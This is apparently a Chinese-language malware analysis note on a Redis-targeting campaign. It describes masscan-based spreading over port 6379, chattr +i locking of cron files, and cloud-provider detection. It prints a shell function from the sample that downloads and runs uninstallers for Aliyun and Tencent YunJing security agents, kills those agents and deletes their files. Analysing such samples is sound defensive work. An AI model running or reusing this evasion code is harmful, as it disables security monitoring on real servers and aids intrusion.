#### 2018.12 更新，攻击者将一些恶意内容放在了：https://github.com/SYSTEMFOUR ；使用chattr +i；检测了云服务商以卸载安全程序；利用开源的masscan进行快速扩散传播

### xbY7p5Tb：
使用masscan对受害机公网IP的255.255.0.0网段进行针对REDIS的6379端口的攻击，以实现扩散(mas目录中)；加入了检查云服务器的功能，针对性卸载安全程序。


### 5bjpjvLP：
基本是对之前发现的样本进行升级，对cron的文件都使用chattr +i加入隐藏属性的操作来防止更改；仍然使用python脚本进行扫描扩散攻击；加入了检查云服务器的功能，针对性卸载安全程序：
```
function a() {
	if ps aux | grep -i '[a]liyun'; then
		wget http://update.aegis.aliyun.com/download/uninstall.sh
		chmod +x uninstall.sh
		./uninstall.sh
		wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
		chmod +x quartz_uninstall.sh
		./quartz_uninstall.sh
		rm -f uninstall.sh 	quartz_uninstall.sh
		pkill aliyun-service
		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
		rm -rf /usr/local/aegis*;
	elif ps aux | grep -i '[y]unjing'; then
		/usr/local/qcloud/stargate/admin/uninstall.sh
		/usr/local/qcloud/YunJing/uninst.sh
		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
	fi
	touch /tmp/.a
}
```
